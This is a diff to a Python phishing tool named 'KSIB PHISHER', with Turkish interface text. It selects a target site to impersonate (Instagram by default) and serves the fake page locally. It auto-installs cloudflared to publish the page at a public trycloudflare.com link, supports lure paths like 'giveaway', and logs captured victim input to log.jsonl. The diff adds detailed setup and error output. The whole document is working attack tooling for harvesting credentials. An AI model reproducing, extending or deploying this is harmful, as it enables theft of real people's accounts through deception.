@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# KSIB PHISHER - FULL OTOMATIK (iSH)
+# KSIB PHISHER - PRO + DETAYLI
 import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket, re
 from http.cookies import SimpleCookie
 from urllib.parse import parse_qs, urlparse
@@ -261,61 +261,89 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         except: pass
     def log_message(self, *args): pass
 
-# ============ OTOMATIK CLOUDFLARE KURULUMU ============
+# ============ OTOMATIK CLOUDFLARE KURULUMU (DETAYLI) ============
 def check_wget():
+    print("   🔍 wget kontrol ediliyor...")
     try:
         subprocess.run(["wget", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("   ✅ wget hazir")
         return True
     except:
+        print("   ❌ wget bulunamadi!")
+        print("   💡 Çözüm: apk add wget")
         return False
 
 def check_cloudflared():
+    print("   🔍 cloudflared kontrol ediliyor...")
     try:
-        subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
+        result = subprocess.run(["cloudflared", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if result.returncode == 0:
+            version = result.stdout.split()[2] if len(result.stdout.split()) > 2 else "bilinmiyor"
+            print(f"   ✅ cloudflared {version} hazir")
+            return True
+        return False
     except:
+        print("   ❌ cloudflared bulunamadi!")
         return False
 
 def install_cloudflared():
-    print("   📥 cloudflared indiriliyor...")
+    print("\n   📥 cloudflared indiriliyor...")
+    print("   ⏳ Bu islem 10-15 saniye sürebilir...")
+    
     try:
         # wget kontrol
         if not check_wget():
-            print("   ❌ wget yok! iSH: apk add wget")
+            print("   ❌ wget gerekli! iSH: apk add wget")
             return False
         
         # indir
-        os.system("wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O /tmp/cloudflared 2>/dev/null")
+        print("   ⬇️  Dosya indiriliyor...")
+        result = os.system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O /tmp/cloudflared 2>&1")
+        
         if not os.path.exists("/tmp/cloudflared"):
-            print("   ❌ indirme basarisiz!")
+            print("   ❌ İndirme başarısız! İnternet bağlantını kontrol et.")
             return False
         
+        # dosya boyutu kontrol
+        size = os.path.getsize("/tmp/cloudflared") / (1024 * 1024)
+        print(f"   📦 Dosya boyutu: {size:.1f} MB")
+        
+        # kurulum
+        print("   🔧 Kurulum yapiliyor...")
         os.system("chmod +x /tmp/cloudflared")
         os.system("mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null")
         
+        # test
+        print("   🧪 Test ediliyor...")
         if check_cloudflared():
-            print("   ✅ cloudflared kuruldu!")
+            print("   ✅ cloudflared başariyla kuruldu! 🎉")
             return True
         else:
-            print("   ❌ kurulum basarisiz!")
+            print("   ❌ Kurulum doğrulamasi başarisiz!")
             return False
     except Exception as e:
         print(f"   ❌ Hata: {e}")
         return False
 
 def start_cloudflare_tunnel(port):
-    print("\n🌐 Cloudflare Tunnel baslatiliyor...")
+    print("\n" + "="*50)
+    print("🌐 CLOUDFLARE TUNNEL BASLATILIYOR")
+    print("="*50)
     
     # cloudflared kontrol
     if not check_cloudflared():
-        print("   ⚠️ cloudflared bulunamadi, kuruluyor...")
+        print("\n   ⚠️ cloudflared bulunamadi, otomatik kurulum başlatiliyor...")
         if not install_cloudflared():
+            print("\n❌ Kurulum başarisiz!")
+            print("   💡 Manuel kurulum: apk add wget")
+            print("   💡 wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm")
+            print("   💡 chmod +x cloudflared-linux-arm && mv cloudflared-linux-arm /usr/local/bin/cloudflared")
             return None
-    else:
-        print("   ✅ cloudflared hazir")
     
     try:
-        # Tüneli başlat
+        print("\n   🔗 Tünel başlatiliyor...")
+        print("   ⏳ Cloudflare'a bağlaniliyor (10-15 saniye)...")
+        
         proc = subprocess.Popen(
             ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
             stdout=subprocess.PIPE,
@@ -323,70 +351,126 @@ def start_cloudflare_tunnel(port):
             text=True
         )
         
-        print("   ⏳ Baglanti bekleniyor...")
-        for i in range(20):
+        for i in range(25):
             time.sleep(1)
             output = proc.stderr.readline()
             if output:
+                # Link bulma
                 if "trycloudflare.com" in output:
                     match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', output)
                     if match:
+                        print(f"   ✅ Link yakalandi! ({i+1}s)")
                         return match.group(0)
+                # Hata yakalama
                 if "ERR" in output or "error" in output.lower():
-                    print(f"   ⚠️ {output.strip()[:80]}")
+                    if "certificate" in output.lower():
+                        print("   ⚠️ Sertifika hatasi, tekrar deneniyor...")
+                    elif "timeout" in output.lower():
+                        print("   ⚠️ Bağlantı zaman aşimi, tekrar deneniyor...")
+                    else:
+                        print(f"   ℹ️ {output.strip()[:80]}")
+                # Başarılı bağlantı mesajları
+                if "Connected" in output or "Connection" in output:
+                    print(f"   ✅ {output.strip()}")
+        
+        print("\n   ❌ Tunnel başlatilamadi! Cloudflare'a bağlanilamiyor.")
+        print("   💡 İnternet bağlantını kontrol et.")
+        print("   💡 VPN açik olabilir, kapatmayi dene.")
         return None
     except Exception as e:
-        print(f"   ❌ Hata: {e}")
+        print(f"\n   ❌ Hata: {e}")
         return None
 
 def main():
     os.system('clear')
     print("""╔══════════════════════════════════╗
-║   🎣 KSIB PHISHER - OTOMATIK  ║
+║   🎣 KSIB PHISHER - PRO       ║
 ║   Cloudflare Tunnel           ║
 ║   iSH Destekli                ║
+║   Otomatik Kurulum            ║
 ╚══════════════════════════════════╝""")
+    
+    print("\n🔐 GIRIS")
+    print("-" * 40)
     for i in range(3):
-        if input("Sifre: ") == PASSWORD: break
-        print(f"Hatali ({2-i})")
-    else: sys.exit(1)
-
-    print("\nSITELER:"); keys = list(SITES.keys())
-    for i,k in enumerate(keys,1): print(f"  [{i}] {SITES[k][0]}")
-    try: sec = int(input("\n> ")); Handler.site = keys[sec-1] if 1<=sec<=len(keys) else "instagram"
-    except: pass
-
-    custom = input(f"\n🔗 Ozel yol (bos = standart): ").strip()
-    Handler.custom_path = custom if custom else ""
-
-    while True:
-        try: port = int(input(f"\nPort (8080): ") or 8080)
-        except ValueError: print("❌ Sayi gir!"); continue
-        try:
-            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            test_sock.bind(("", port)); test_sock.close()
+        if input("Sifre: ") == PASSWORD: 
+            print("✅ Hos geldin!")
             break
-        except OSError: print(f"❌ Port {port} kullaniliyor!"); continue
+        print(f"❌ Hatali! Kalan hak: {2-i}")
+    else: 
+        print("❌ 3 hatali deneme! Program kapaniyor.")
+        sys.exit(1)
+
+    print("\n🎯 HEDEF SITE SECIMI")
+    print("-" * 40)
+    keys = list(SITES.keys())
+    for i,k in enumerate(keys,1): 
+        print(f"  [{i}] {SITES[k][0]}")
+    try: 
+        sec = int(input("\n> "))
+        Handler.site = keys[sec-1] if 1<=sec<=len(keys) else "instagram"
+        print(f"✅ Seçilen site: {SITES[Handler.site][0]}")
+    except: 
+        Handler.site = "instagram"
+        print("⚠️ Geçersiz seçim! Varsayilan: Instagram")
+
+    print("\n🔗 OZEL YOL (Opsiyonel)")
+    print("-" * 40)
+    print("   Örnek: 'giveaway' → site.com/giveaway")
+    custom = input("   Ozel yol (bos = standart): ").strip()
+    Handler.custom_path = custom if custom else ""
+    if custom: print(f"   ✅ {custom} olarak ayarlandi")
+
+    print("\n📡 PORT AYARI")
+    print("-" * 40)
+    while True:
+        try: 
+            port = int(input("   Port (8080): ") or 8080)
+            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            test_sock.bind(("", port))
+            test_sock.close()
+            print(f"   ✅ Port {port} musait")
+            break
+        except ValueError: 
+            print("   ❌ Sayi girmelisin!")
+        except OSError: 
+            print(f"   ❌ Port {port} kullaniliyor!")
 
     # Tunnel başlat
     tunnel_url = start_cloudflare_tunnel(port)
 
     if not tunnel_url:
-        print("\n❌ TUNEL BASARISIZ!")
-        print("   iSH: apk add wget")
-        print("   Tekrar dene.")
+        print("\n" + "="*50)
+        print("❌ TUNEL BASARISIZ!")
+        print("="*50)
+        print("   💡 Çözüm önerileri:")
+        print("      • İnternet bağlantısını kontrol et")
+        print("      • iSH'de: apk add wget openssh-client")
+        print("      • Tekrar dene")
         sys.exit(1)
 
-    print(f"\n{'='*50}\n✅ Site: {SITES[Handler.site][0]}")
-    print(f"\n🌐 BASARILI!\n   🔗 {tunnel_url}")
-    if custom: print(f"   🔗 {tunnel_url}/{custom}")
-    print(f"\n📝 Log: log.jsonl\n🛑 Ctrl+C\n{'='*50}\n")
+    print("\n" + "="*50)
+    print("✅ TUM ISLEMLER BASARILI!")
+    print("="*50)
+    print(f"\n🌐 SITE: {SITES[Handler.site][0]}")
+    print(f"🔗 LINK: {tunnel_url}")
+    if custom: print(f"🔗 OZEL LINK: {tunnel_url}/{custom}")
+    print(f"\n📝 LOG: log.jsonl")
+    print("🛑 DURDUR: Ctrl+C")
+    print("\n" + "="*50)
 
-    try: server = CustomTCPServer(("", port), Handler)
-    except OSError: print(f"❌ Port {port} kullaniliyor!"); sys.exit(1)
-    try: server.serve_forever()
-    except KeyboardInterrupt: server.shutdown(); print("\n🛑 Durduruldu!")
+    try: 
+        server = CustomTCPServer(("", port), Handler)
+    except OSError: 
+        print(f"❌ Port {port} kullaniliyor!")
+        sys.exit(1)
+    
+    try: 
+        server.serve_forever()
+    except KeyboardInterrupt: 
+        server.shutdown()
+        print("\n🛑 Sunucu durduruldu!")
 
 if __name__ == "__main__":
     try: main()
-    except KeyboardInterrupt: print("\nCikis!"); sys.exit(0)
+    except KeyboardInterrupt: print("\n👋 Cikis!"); sys.exit(0)
